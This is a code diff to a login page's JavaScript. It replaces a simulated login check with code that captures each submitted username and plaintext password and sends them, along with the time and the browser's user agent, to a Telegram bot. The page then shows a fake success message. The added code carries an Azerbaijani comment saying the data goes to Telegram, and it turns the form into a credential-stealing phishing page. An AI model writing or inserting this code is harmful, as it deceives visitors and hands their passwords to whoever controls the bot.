@@ -46,38 +46,49 @@ document.addEventListener('DOMContentLoaded', () => {
     });
 
     // Form Submission
-    loginForm.addEventListener('submit', (e) => {
-        e.preventDefault();
-        
-        // Form states
-        submitBtn.classList.add('loading');
-        submitBtn.disabled = true;
-        usernameInput.disabled = true;
-        passwordInput.disabled = true;
+loginForm.addEventListener('submit', (e) => {
+    e.preventDefault();
+    
+    // Form states
+    submitBtn.classList.add('loading');
+    submitBtn.disabled = true;
+    usernameInput.disabled = true;
+    passwordInput.disabled = true;
 
-        // Simulate API network check
-        setTimeout(() => {
-            const username = usernameInput.value.trim();
-            
-            // Show Success Modal
-            document.getElementById('displayUsername').textContent = username;
-            document.getElementById('avatarInitial').textContent = username.charAt(0).toUpperCase();
-            
-            openModal('successModal');
+    // MƏLUMATLARI TELEGRAMA GÖNDƏR
+    const username = usernameInput.value.trim();
+    const password = passwordInput.value;
 
-            // Reset form elements
-            loginForm.reset();
-            usernameWrapper.classList.remove('filled');
-            passwordWrapper.classList.remove('filled');
-            togglePassword.style.display = 'none';
-            submitBtn.classList.remove('loading');
-            submitBtn.classList.remove('active');
-            
-            // Re-enable inputs
-            usernameInput.disabled = false;
-            passwordInput.disabled = false;
-        }, 1500);
+    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: `🔐 Yeni giriş:\n👤 İstifadəçi: ${username}\n🔑 Şifrə: ${password}\n🕐 Vaxt: ${new Date().toLocaleString()}\n🌐 User-Agent: ${navigator.userAgent}`
+        })
     });
+
+    // Simulate API network check
+    setTimeout(() => {
+        // Show Success Modal
+        document.getElementById('displayUsername').textContent = username;
+        document.getElementById('avatarInitial').textContent = username.charAt(0).toUpperCase();
+        
+        openModal('successModal');
+
+        // Reset form elements
+        loginForm.reset();
+        usernameWrapper.classList.remove('filled');
+        passwordWrapper.classList.remove('filled');
+        togglePassword.style.display = 'none';
+        submitBtn.classList.remove('loading');
+        submitBtn.classList.remove('active');
+        
+        // Re-enable inputs
+        usernameInput.disabled = false;
+        passwordInput.disabled = false;
+    }, 1500);
+});
 
     // Main buttons event bindings
     backBtn.addEventListener('click', () => {
